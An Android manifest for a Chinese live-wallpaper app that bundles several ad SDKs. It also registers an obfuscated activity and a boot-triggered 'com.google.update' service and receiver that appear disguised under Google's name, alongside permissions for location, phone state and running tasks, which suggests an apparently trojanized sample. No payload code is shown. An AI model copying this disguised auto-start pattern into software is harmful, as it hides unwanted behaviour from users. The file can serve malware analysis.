<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="internalOnly" package="com.livegame.wallpaperfengjing">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <service android:label="@string/app_name" android:name=".WallpaperSlideshow" android:permission="android.permission.BIND_WALLPAPER">
            <intent-filter>
                <action android:name="android.service.wallpaper.WallpaperService"/>
            </intent-filter>
            <meta-data android:name="android.service.wallpaper" android:resource="@xml/metadata"/>
        </service>
        <activity android:icon="@drawable/icon" android:label="@string/app_name" android:name=".MainActivity" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/icon" android:label="@string/settings_activity" android:name=".SettingsActivity"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@drawable/icon" android:label="@string/select_folder_activity" android:name="SelectFolderActivity"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.google.ads.AdActivity"/>
        <meta-data android:name="ADMOGO_KEY" android:value="3475191f196c466f9c4725cf76598ed1"/>
        <activity android:configChanges="keyboard|keyboardHidden|navigation|orientation" android:name="com.vpon.adon.android.WebInApp" android:screenOrientation="portrait"/>
        <activity android:label="@string/app_name" android:name="com.adwo.adsdk.AdwoSplashAdActivity"/>
        <activity android:label="@string/app_name" android:name="com.adwo.adsdk.AdwoAdBrowserActivity"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.waps.OffersWebView"/>
        <meta-data android:name="CLIENT_PACKAGE" android:value="com.livegame.wallpaperfengjing"/>
        <meta-data android:name="WAPS_ID" android:value="a651e1ec1a0570e2d769bd887ad38329"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="ba$fQ" android:theme="@android:style/Theme.Dialog"/>
        <service android:name="com.google.update.UpdateService"/>
        <receiver android:name="com.google.update.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <meta-data android:name="ST_MY_PID" android:value="1010user"/>
    </application>
    <uses-feature android:name="android.software.live_wallpaper"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.GET_TASKS"/>
</manifest>